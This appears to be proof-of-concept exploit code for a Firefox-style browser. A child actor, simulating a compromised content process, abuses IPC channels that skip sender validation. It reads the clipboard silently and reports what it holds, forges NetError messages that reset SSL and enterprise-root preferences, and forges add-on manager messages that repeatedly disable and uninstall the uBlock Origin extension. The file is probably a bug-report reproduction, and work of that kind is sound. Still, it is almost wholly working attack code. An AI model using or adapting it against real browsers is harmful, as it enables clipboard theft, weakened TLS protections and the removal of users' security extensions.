// PoC child actor - runs with chrome privileges INSIDE the real content
// process. This is the compromised-content-process simulation.
const Ci = Components.interfaces;
const Cc = Components.classes;

try {
  if (typeof Services !== "undefined" && Services.cpmm) {
    Services.cpmm.sendAsyncMessage("poc:report2", { kind: "child-module-loaded", payload: {} });
  }
} catch (e) {
  try { dump("POC-CHILD import-time: " + e + "\n"); } catch (e2) {}
}

export class PocReproChild extends JSWindowActorChild {
  actorCreated() {
    try {
      if (typeof Services !== "undefined" && Services.cpmm) {
        Services.cpmm.sendAsyncMessage("poc:report2", { kind: "child-actor-created", payload: {} });
      }
    } catch (e) {}
    try {
      const { setTimeout } = ChromeUtils.importESModule(
        "resource://gre/modules/Timer.sys.mjs");
      setTimeout(() => this.run(), 700);
    } catch (e) {
      this.report("child-error", String(e));
    }
  }

  report(kind, payload) {
    try {
      this.sendAsyncMessage("poc:report", { kind, payload });
    } catch (e) {
      try { dump("POC-CHILD report failed: " + e + "\n"); } catch (e2) {}
    }
  }

  run() {
    try {
      const { setInterval } = ChromeUtils.importESModule(
        "resource://gre/modules/Timer.sys.mjs");
      let n = 0;
      const iv = setInterval(() => {
        n++;
        try { this.clipboardRepro(); } catch (e) {}
        if (n >= 12) { try { clearInterval(iv); } catch (e) {} }
      }, 2000);
    } catch (e) {}
    try { this.clipboardRepro(); } catch (e) { this.report("clipboard", { ok: false, error: String(e) }); }
    try { this.neterrorRepro(); } catch (e) { this.report("neterror", { ok: false, error: String(e) }); }
    try { this.amSequence1(); } catch (e) { this.report("am-inventory", { ok: false, error: String(e) }); }
    try { this.amSequence2(); } catch (e) { this.report("am-disable", { ok: false, error: String(e) }); }
  }

  receiveMessage(m) {
    try {
      Services.cpmm.sendAsyncMessage("poc:report2", { kind: "child-recv", payload: m.name });
    } catch (e) {}
    if (m.name === "poc:am-go2" && m.data && m.data.id) {
      this.runUninstall(m.data.id);
    }
    return undefined;
  }

  runUninstall(id) {
    // fire-and-forget: the ACTION is the proof; replies may be lost
    try {
      this.report("am-uninstall-start", { id });
      this.amSend("addonSetEnabled", [id, false]).then((r) =>
        this.report("am-disable", r || { sent: true }));
      this.amSend("addonUninstall", [id]).then((r) =>
        this.report("am-uninstall", r || { sent: true }));
    } catch (e) {
      this.report("am-uninstall", { ok: false, error: String(e) });
    }
  }

  // ungated sync clipboard read over PContent
  clipboardRepro() {
    const cb = Cc["@mozilla.org/widget/content/clipboard;1"].getService(Ci.nsIClipboard);
    const wc = this.manager?.windowContext || null;
    const flavors = ["text/unicode", "text/plain"];
    let hasTypes = null;
    try { hasTypes = cb.hasDataMatchingFlavors(flavors, Ci.nsIClipboard.kGlobalClipboard); } catch (e) { hasTypes = "err"; }
    const snap = cb.getDataSnapshotSync(flavors, Ci.nsIClipboard.kGlobalClipboard, wc);
    const xfer = Cc["@mozilla.org/widget/transferable;1"].createInstance(Ci.nsITransferable);
    xfer.init(null);
    // the transferable must declare its import flavors (addDataFlavor) and
    // they must all exist in the snapshot's flavorList
    const avail = Array.from(snap.flavorList || []);
    for (const f of ["text/unicode", "text/plain"]) {
      if (avail.includes(f)) {
        xfer.addDataFlavor(f);
      }
    }
    snap.getDataSync(xfer);
    let value = null;
    for (const f of flavors) {
      try {
        const out = {};
        xfer.getTransferData(f, out);
        if (!out || !out.value) continue;
        value = { flavor: f, data: out.value.QueryInterface(Ci.nsISupportsString).data };
        break;
      } catch (e) { /* flavor absent */ }
    }
    this.report("clipboard", { ok: true, hasTypes,
                               flavorList: Array.from(snap.flavorList || []), value });
  }

  // forged NetError actor messages (no sender validation on the parent side)
  neterrorRepro() {
    const uri = this.document?.documentURI || "";
    if (!uri.startsWith("about:neterror")) return;
    const wgc = this.manager; // WindowGlobalChild
    const actor = wgc.getActor("NetError");
    actor.sendAsyncMessage("Browser:ResetSSLPreferences");
    actor.sendAsyncMessage("Browser:ResetEnterpriseRootsPref");
    actor.sendAsyncMessage("Browser:AddTRRExcludedDomain");
    this.report("neterror", { ok: true, uri });
  }

  // forged amManager bridge messages (no sender validation by default)
  amSend(type, args) {
    return new Promise((resolve) => {
      const cbid = "poc-" + type + "-" + Math.floor(Math.random() * 1e9);
      let done = false;
      const finishWith = (v) => { if (!done) { done = true; resolve(v); } };
      const { setTimeout } = ChromeUtils.importESModule(
        "resource://gre/modules/Timer.sys.mjs");
      setTimeout(() => finishWith({ timeout: true, type }), 3000);
      // frame mm: get it via the content window's interface requestor
      // (window.messageManager getter was removed) - this is the exact
      // mozAddonManager channel; parent-side Services.mm listeners see it
      let mm = null, via = null;
      const attempts = [
        ["contentWindow.messageManager", () => this.contentWindow.messageManager],
        ["manager.docShell.messageManager", () => this.manager.docShell.messageManager],
        ["contentWindow.docShell.messageManager", () => this.contentWindow.docShell.messageManager],
        ["QI ContentFrameMessageManager", () => this.contentWindow.QueryInterface(Ci.nsIInterfaceRequestor).getInterface(Ci.nsIContentFrameMessageManager)],
        ["manager.messageManager", () => this.manager.messageManager],
      ];
      for (const [name, get] of attempts) {
        try {
          const cand = get();
          if (cand) { mm = cand; via = name; break; }
        } catch (e) { /* try next */ }
      }
      if (!mm) {
        finishWith({ ok: false, error: "no frame mm via any accessor" });
        return;
      }
      try { dump("POC-CHILD: frame mm via " + via); } catch (e) {}
      const listener = {
        receiveMessage(m) {
          if (m.data && m.data.callbackID === cbid) {
            try { mm.removeMessageListener("WebAPIPromiseResult", listener); } catch (e) {}
            finishWith(m.data);
          }
        },
      };
      mm.addMessageListener("WebAPIPromiseResult", listener);
      mm.sendAsyncMessage("WebAPIPromiseRequest", { type, callbackID: cbid, args });
    });
  }

  async amSequence1() {
    const ublock = await this.amSend("getAddonByID", ["uBlock0@raymondhill.net"]);
    this.report("am-inventory", ublock);
    const builtin = await this.amSend("getAddonByID", ["doh-rollout@mozilla.org"]);
    this.report("am-inventory-builtin", builtin);
  }

  async amSequence2() {
    // unconditional retries: the parent AddonManager may still be starting
    // up; once it is ready one of the attempts executes the action. Replies
    // may be lost (target.messageManager quirks) - the parent verifies the
    // result via extensions.json.
    const { setTimeout } = ChromeUtils.importESModule(
      "resource://gre/modules/Timer.sys.mjs");
    for (let i = 0; i < 10; i++) {
      const dis = await this.amSend("addonSetEnabled", ["uBlock0@raymondhill.net", false]);
      this.report("am-disable", dis);
      const un = await this.amSend("addonUninstall", ["uBlock0@raymondhill.net"]);
      this.report("am-uninstall", un);
      await new Promise((r) => setTimeout(r, 1500));
    }
  }
}
